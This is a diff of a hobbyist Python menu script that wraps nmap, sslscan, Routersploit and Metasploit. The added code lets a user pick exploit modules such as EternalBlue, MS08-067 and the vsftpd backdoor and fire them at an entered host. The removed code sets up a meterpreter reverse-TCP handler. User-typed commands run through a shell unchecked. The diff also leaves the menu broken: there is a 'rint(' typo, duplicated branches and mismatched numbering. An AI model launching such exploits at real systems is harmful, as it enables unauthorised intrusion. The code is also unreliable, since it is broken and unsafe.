@@ -340,9 +340,12 @@ def exiting_loading_screen():
    sys.exit()  # Exit the program
 
 # Function to run SSLScan on a given IP with command selection
+import subprocess
+from colorama import Fore
+
 def sslscan_scan():
    global scanning_in_progress
-   ip = get_ip_address()
+   ip = get_ip_address()  # Assuming this is your method to get the IP address
    if ip:
       scanning_in_progress = True
       try:
@@ -354,6 +357,7 @@ def sslscan_scan():
         print("5. Vuln Scan")
         # Added new option
         choice = input(Fore.BLUE + "\nEnter your choice: ").strip()
+
         # Define the SSLScan command based on the user's choice
         if choice == '1':
            command = f"sslscan {ip}"
@@ -362,23 +366,29 @@ def sslscan_scan():
         elif choice == '3':
            command = f"sslscan --cert {ip}"
         elif choice == '4':
+           # Handle manual input command
            command = input(Fore.BLUE + "Enter your SSLScan command: ").strip()
+           if not command:
+               print(Fore.RED + "No command entered. Returning to menu.")
+               return  # Exit if no command is entered
         elif choice == '5':
-           command = f"sslscan --bugs {ip}"
-           # New command for Vuln Scan
+           command = f"sslscan --bugs {ip}"  # New command for Vuln Scan
         else:
            print(Fore.RED + "Invalid choice. Exiting SSLScan.")
            return
+
         # Run the selected SSLScan command
         print(Fore.BLUE + f"Running {command}...")
         process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         stdout, stderr = process.communicate()
+
         if stderr:
            print(Fore.RED + "Error during SSLScan:", stderr.decode())
         else:
            output = stdout.decode()
            print(Fore.BLUE + "SSLScan Completed Successfully.")
            print(output)
+           
            # Save SSL scan results to a file
            file_name = input(Fore.LIGHTWHITE_EX + "Enter file name to save the results: ").strip()
            with open(file_name, "a") as file:
@@ -388,7 +398,7 @@ def sslscan_scan():
         print(Fore.RED + f"Error running SSLScan: {e}")
       finally:
         scanning_in_progress = False
-        clear_screen()
+        clear_screen()  # Assuming clear_screen() is defined elsewhere
 
 # Function to show SSLScan commands list (option 66)
 def show_sslscan_commands():
@@ -400,7 +410,7 @@ def show_sslscan_commands():
       "sslscan --cert {ip} SSL Certificate Details",
       "sslscan --tls1_2 {ip} Check TLS 1.2 Support"
    ]
-   show_submenu(ssl_commands)
+   show_submenu(ssl_commands)  # Assuming show_submenu() is defined elsewhere
 
 def show_all_metasploit_commands():
    clear_screen()
@@ -443,101 +453,77 @@ def update_script():
 # Function to run Metasploit
 # Function to run Metasploit
 # Function to run Metasploit
+import os
+import tempfile
+from colorama import Fore
+
 def metasploit_scan():
-   global scanning_in_progress
-   ip = get_ip_address()
-   if ip:
-      scanning_in_progress = True
-      try:
-        while True:
-           print(Fore.BLUE + "\nChoose a Metasploit option:")
-           print("1. Scan for vulnerabilities")
-           print("2. Exploit a vulnerability")
-           print("3. Manual Metasploit")
-           print("4. View all Metasploit commands (-h)")
-           print("5. View Network Exploits")
-           print("99. Return to main menu")
-           choice = input(Fore.BLUE + "\nEnter your choice: ").strip()
-           if choice == '1':
-              command = f"msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {ip}; set lport 4444; exploit -j'"
-              print(Fore.BLUE + f"Running {command}...")
-              process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-              stdout, stderr = process.communicate()
-              if stderr:
-                print(Fore.RED + "Error during Metasploit:", stderr.decode())
-              else:
-                output = stdout.decode()
-                print(Fore.BLUE + "Metasploit Completed Successfully.")
-                print(output)
-           elif choice == '2':
-              command = f"msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set LHOST {ip} LHOST 4444 exploit'"
-              print(Fore.BLUE + f"Running {command}...")
-              process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-              stdout, stderr = process.communicate()
-              if stderr:
-                print(Fore.RED + "Error during Metasploit:", stderr.decode())
-              else:
-                output = stdout.decode()
-                print(Fore.BLUE + "Metasploit Completed Successfully.")
-                print(output)
-           elif choice == '3':
-              command = input(Fore.BLUE + "Enter your Metasploit command: ").strip()
-              print(Fore.BLUE + f"Running {command}...")
-              process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-              stdout, stderr = process.communicate()
-              if stderr:
-                print(Fore.RED + "Error during Metasploit:", stderr.decode())
-              else:
-                output = stdout.decode()
-                print(Fore.BLUE + "Metasploit Completed Successfully.")
-                print(output)
-           elif choice == '4':
-              print(Fore.BLUE + "\nViewing all Metasploit commands...")
-              command = "msfconsole -h"
-              print(Fore.BLUE + f"Running {command}...")
-              process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-              stdout, stderr = process.communicate()
-              if stderr:
-                print(Fore.RED + "Error during Metasploit:", stderr.decode())
-              else:
-                output = stdout.decode()
-                print(Fore.BLUE + "Metasploit Commands:")
-                print(output)
-           elif choice == '5':
-              print(Fore.BLUE + "\nViewing all network exploits...")
-              exploits = {
-               "11": "exploit/multi/http/tomcat_mgr_upload",
-                "22": "exploit/windows/dcerpc/ms03_026_dcom",
-                "33": "exploit/windows/smb/ms08_067_netapi",
-                "44": "exploit/unix/ftp/vsftpd_234_backdoor",
-                "55": "exploit/multi/http/struts2_code_exec",
-                "66": "exploit/multi/http/jboss_deployment_scanner"
-              }
-              for key, value in exploits.items():
-                print(f"{key}: {value}")
-              exploit_choice = input(Fore.BLUE + "\nEnter the number of the exploit you want to run: ").strip()
-              if exploit_choice in exploits:
-                metasploit_command = f"msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {ip}; set lport 4444; exploit -j'"
-                subprocess.Popen(metasploit_command, shell=True)
-                stdout, stderr = process.communicate()
-                if stderr:
-                   print(Fore.RED + "Error during Metasploit:", stderr.decode())
+    ip = get_ip_address()  # Prompt for IP address
+    if ip:
+        port = get_port_number()  # Prompt for port number
+        if not port:
+            print(Fore.RED + "No port entered. Returning to the main menu...")
+            return
+        try:
+            while True:
+                print(Fore.BLUE + "\nChoose a Metasploit option:")
+                print("1. Scan for vulnerabilities")
+                print("3. Manual Metasploit")
+                print("4. Run Exploits")
+                print("99. Return to main menu")
+                choice = input(Fore.BLUE + "\nEnter your choice: ").strip()
+
+                metasploit_commands = ""
+                if choice == '1':
+                    metasploit_commands = f"auxiliary/scanner/http/http_version"
+                elif choice == '3':
+                    metasploit_commands = input(Fore.BLUE + "Enter your Metasploit commands (separated by newlines):\n")
+                elif choice == '4':
+                    print(Fore.BLUE + "\nExploits")
+                    exploits = {
+                        "11": "exploit/multi/http/tomcat_mgr_upload",
+                        "22": "exploit/windows/dcerpc/ms03_026_dcom",
+                        "33": "exploit/windows/smb/ms08_067_netapi",
+                        "44": "exploit/unix/ftp/vsftpd_234_backdoor",
+                        "55": "exploit/multi/http/struts2_code_exec",
+                        "66": "exploit/multi/http/jboss_deployment_scanner",
+                        "77": "exploit/windows/smb/ms17_010_eternalblue ",
+                        "88": "exploit/multi/handler",
+                    }
+                    for key, value in exploits.items():
+                        print(f"{key}: {value}")
+                    exploit_choice = input(Fore.BLUE + "\nEnter the number of the exploit you want to run: ").strip()
+                    if exploit_choice in exploits:
+                        metasploit_commands = f"use {exploits[exploit_choice]}\nset RHOSTS {ip}\nset RPORT {port}\nrun"
+                    else:
+                        print(Fore.RED + "Invalid exploit choice.")
+                        continue
+                elif choice == '99':
+                    print(Fore.LIGHTCYAN_EX + "Returning to the main menu...")
+                    break
                 else:
-                   output = stdout.decode()
-                   print(Fore.BLUE + "Metasploit Completed Successfully.")
-                   print(output)
-              else:
-                print(Fore.RED + "Invalid exploit choice.")
-           elif choice == '99':
-              scanning_in_progress = False
-              break
-           else:
-              print(Fore.RED + "Invalid choice. Please try again.")
-      except Exception as e:
-        print(Fore.RED + f"Error running Metasploit: {e}")
-      finally:
-        scanning_in_progress = False
-        clear_screen()
+                    print(Fore.RED + "Invalid choice. Please try again.")
+                    continue
+
+                # Run the command in Metasploit
+                if metasploit_commands:
+                    print(Fore.BLUE + "Launching Metasploit...")
+
+                    # Create a temporary resource file to hold the Metasploit commands
+                    with tempfile.NamedTemporaryFile(delete=False, mode='w', suffix='.rc') as rc_file:
+                        rc_file.write(metasploit_commands)
+                        rc_file_path = rc_file.name
+
+                    # Use the -r option to pass the resource file to msfconsole for faster execution
+                    full_command = f"msfconsole -q -r {rc_file_path}"
+                    os.system(full_command)
+
+                    # Delete the temporary resource file after execution
+                    os.remove(rc_file_path)
+                    break  # Exit the loop after launching Metasploit
+
+        except Exception as e:
+            print(Fore.RED + f"Error running Metasploit: {e}")
 
 
 # Function to run Routersploit
@@ -554,7 +540,7 @@ def routersploit_scan():
            print("2. Exploit a vulnerability")
            print("3. Manual Routersploit")
            print("4. View all Routersploit commands (-h)")
-           print("5. View Network Exploits")
+           print("5. View Network Exploit")
            print("99. Return to main menu")
            choice = input(Fore.WHITE + "\nEnter your choice: ").strip()
            if choice == '1':
@@ -648,6 +634,16 @@ def routersploit_scan():
         scanning_in_progress = False
         clear_screen()
 
+def get_port_number():
+    while True:
+        port = input("\nEnter port number to scan (or press 'q' to cancel): ").strip()
+        if port.lower() == 'q':
+            print("\nExiting port input...")
+            return None
+        if port.isdigit() and 1 <= int(port) <= 65535:
+            return port
+        else:
+            print(Fore.RED + "Invalid port number. Please enter a number between 1 and 65535.")
 
 
 # Main menu function with options
@@ -657,48 +653,28 @@ def main_menu():
       print(Fore.YELLOW+ "Run Root To Save Results of Nmap Scans: sudo python3 nethunt.py & Updates")
       print(Fore.LIGHTGREEN_EX+"alot broken accept nmap and sslscan only manual scan is broken for sslscan finish comming soon!...")
       print(Fore.LIGHTYELLOW_EX + "V 0.1 biskit@")
-      print(Fore.LIGHTWHITE_EX+"1. Automatic Scan")
-      print(Fore.LIGHTWHITE_EX+"2. Automatic Scan (No DNS)")
-      print(Fore.LIGHTWHITE_EX+"3. Automatic Stealth Scan")
-      print(Fore.LIGHTWHITE_EX+"4. Scan Multiple IP Addresses")
-      print(Fore.LIGHTWHITE_EX+"5. Show All Nmap Commands")
-      print(Fore.LIGHTWHITE_EX+"6. Show OS Scan Commands")
-      print(Fore.LIGHTWHITE_EX+"7. Show NSE Script Commands")
-      print(Fore.LIGHTWHITE_EX+"8. Show Firewall Scan Commands")
-      print(Fore.LIGHTWHITE_EX+"9. Manual Nmap Scan")
-      print(Fore.LIGHTWHITE_EX+"10. SSLScan")
-      print(Fore.LIGHTWHITE_EX+"11. Routersploit")
-      print(Fore.LIGHTWHITE_EX+"12. Metasploit")
-      print(Fore.LIGHTWHITE_EX+"13. Update Script")
-      print(Fore.LIGHTCYAN_EX+"14. Exit")
+      rint(Fore.LIGHTWHITE_EX+"1. nmap")
+      print(Fore.LIGHTWHITE_EX+"2. Show All Nmap Commands")
+      print(Fore.LIGHTWHITE_EX+"3. sslscan")
+      print(Fore.LIGHTWHITE_EX+"4. Routersploit")
+      print(Fore.LIGHTWHITE_EX+"5. Metasploit")
+      print(Fore.LIGHTWHITE_EX+"6. Update Script")
+      print(Fore.LIGHTCYAN_EX+"99. Exit")
       choice = input(Fore.RED + "\nEnter your choice: ").strip()
       if choice == '1':
-        automatic_scan()
-      elif choice == '2':
-        automatic_scan_no_dns()
-      elif choice == '3':
-        automatic_stealth_scan()
-      elif choice == '4':
-        scan_ip_0_24()
-      elif choice == '5':
+        
         show_all_nmap_commands()
-      elif choice == '6':
-        show_os_scan_commands()
-      elif choice == '7':
-        show_nse_script_commands()
-      elif choice == '8':
-        show_firewall_scan_commands()
-      elif choice == '9':
+      elif choice == '1':
         normal_nmap_scan()
-      elif choice == '10':
+      elif choice == '2':
         sslscan_scan()
-      elif choice == '11':
+      elif choice == '3':
         routersploit_scan()
-      elif choice == '12':
+      elif choice == '4':
         metasploit_scan()
-      elif choice == '13':
+      elif choice == '5':
         update_script()
-      elif choice == '14':
+      elif choice == '99':
         exiting_loading_screen()
       else:
         print(Fore.RED + "Invalid choice. Please try again.")
